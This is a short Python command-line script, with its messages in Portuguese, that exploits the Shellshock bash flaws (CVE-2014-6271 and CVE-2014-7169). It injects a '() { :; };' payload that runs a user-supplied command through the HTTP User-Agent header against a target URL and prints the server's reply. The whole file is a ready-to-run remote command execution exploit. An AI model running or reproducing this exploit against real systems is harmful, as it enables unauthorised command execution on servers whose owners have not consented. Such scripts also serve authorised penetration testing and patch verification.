#!/usr/bin/env python3

import requests
import argparse

def exploit(url, cmd):
        header = {'User-Agent': '() { :; }; echo; echo; /bin/bash -c ' + cmd}
        try:
            response = requests.get(url, headers=header)
            
            if response.status_code == 200:
                print(f"Resposta do servidor:{response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao fazer a solicitação com o User Agent {[cmd]} -> {e}")


def main():
    parser = argparse.ArgumentParser("CVE-2014-6271 & CVE-2014-7169 | Shellshock")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-c", "--command", required=True)

    args = parser.parse_args()
    try:
         exploit(args.target, args.command)
    except KeyboardInterrupt:
         exit(1)
    except EOFError:
         exit(1)

if __name__ == '__main__':
    main()